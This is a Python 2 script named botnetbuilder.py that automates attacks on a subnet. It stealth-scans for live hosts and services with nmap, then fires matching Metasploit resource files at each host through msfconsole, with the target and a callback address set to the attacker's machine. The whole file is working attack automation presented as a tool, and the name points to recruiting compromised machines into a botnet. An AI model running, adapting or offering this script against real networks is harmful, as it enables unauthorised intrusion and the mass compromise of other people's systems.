#
# botnetbuilder.py 
#
# Dane Fichter - 4/18/15
#
# This tool is intended to automate the steps a crude attacker might take 
# upon gaining access to a subnet. We begin by performing an nmap scan to
# discover hosts and services. Then we use the msfconsole to deploy 
# exploits in the background according to premade .rc files 

import netifaces as ni
import nmap
import os
import subprocess
import sys

# Performs a scan on a given subnet.
# Returns a python-nmap scan result object.
def scan(subnet):

  print "Starting scan on subnet " + subnet + "...."
  nm = nmap.PortScanner()

  #stealth scan#
  try:
  	nm.scan(hosts=subnet, arguments='-sS')

  #UNEXPECTED ERROR, CRASH#
  except:
  	print "UNEXPECTED ERROR:"
  	raise

  host_info = {}

  #print out scan results#
  for host in nm.all_hosts():
    
    #print and track live hosts#
    if nm[host].state() == 'up':
      print "FOUND LIVE HOST: " + host
      host_info[host] = []

      #list all service info#
      #iterate over all protocols and ports#
      for proto in nm[host].all_protocols():
      	lport = list(nm[host][proto].keys())
      	lport.sort()
      	print lport

      	for port in lport:
      		print('port: %s \tstate: %s \tname: %s' % (port, nm[host][proto][port]['state'], nm[host][proto][port]['name']))
      		host_info[host].append(nm[host][proto][port]['name'])

  return host_info

#Given a path to an .rc file which lists msfconsole commands,deploy the attack#
def deploy_attack(attack_file, target_ip):

	#get my IP#
	my_ip = ni.ifaddresses('eth0')[2][0]
	
	#Edit file to reflect target ip, port of target service#
	#Read from existing, edit write to temp#
	f = open(attack_file, "r")
	temp = open(attack_file+".tmp", "w")

	for line in f:

		if ("set" in line) or ("SET" in line) :

			if "RHOST" in line:
				line = "set RHOST "+target_ip+"\n"
			elif "LHOST" in line:
				line = "set LHOST "+my_ip+"\n"
		temp.write(line)

	f.close()
	temp.close()

	#delete file, copy temp to file, delete temp#
	os.remove(attack_file)
	f = open(attack_file, "w")
	temp = open(attack_file+".tmp", "r")
	for line in temp:
		f.write(line)

	f.close()
	temp.close()
	os.remove(attack_file+".tmp")

	#deploy attack#
	subprocess.call(["msfconsole", "-r", attack_file])


#Given a dictionary of python-nmap scan results#
#Iterate through all .rc files in the attacks/ #
#folder and deploy them using msfconsole. Stop #
#once an attack is successful # 
def attack(scan_info):

	for host in scan_info.keys():
		print "BEGINNING ATTACK ON: " + host

		#first, look for .rc file matching the service#
		for name in scan_info[host]:
		
			print('Searching for matching attack files for service: %s' % name)

			#Search 'attacks' folder for matching service folder#
			path = "attacks/"+name+"/"
			if(os.path.isdir(path)):

				#get .rc files from directory#
				attack_files = []

				for f in os.listdir(path):
					if os.path.isfile(path+f) and (".rc" in f):
						attack_files.append(path+f)

				print('Found ' + str(len(attack_files)) + ' matching attacks for service ' + name)

				#call helper func to deploy attacks#
				for f in attack_files:
					deploy_attack(f, host)
			else:
				print('No matching attacks for service: %s' % name)

if __name__ == "__main__":

  #one CLARG of interest, the subnet specifier#
  if len(sys.argv) != 2:
    print "USAGE: python botnetbuilder.py subnet"
    print "Example: python botnetbuilder.py 192.168.1.1/24"
    sys.exit()

  subnet = sys.argv[1]
  scan_info = scan(subnet)
  attack(scan_info)
    
